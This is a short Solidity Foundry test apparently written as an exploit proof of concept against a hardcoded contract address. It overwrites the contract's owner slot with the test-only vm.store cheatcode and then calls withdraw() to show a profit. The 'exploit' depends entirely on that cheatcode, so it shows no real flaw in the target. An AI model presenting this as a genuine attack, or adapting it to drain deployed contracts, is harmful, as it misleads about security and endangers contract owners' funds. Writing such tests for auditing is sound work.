// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface INomos {
    function withdraw() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        deal(TARGET, 10 ether);
        // The _owner variable is the first variable in the Ownable contract, placing it at storage slot 0.
        // We use vm.store to overwrite this slot with the attacker's address.
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        INomos(TARGET).withdraw();
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}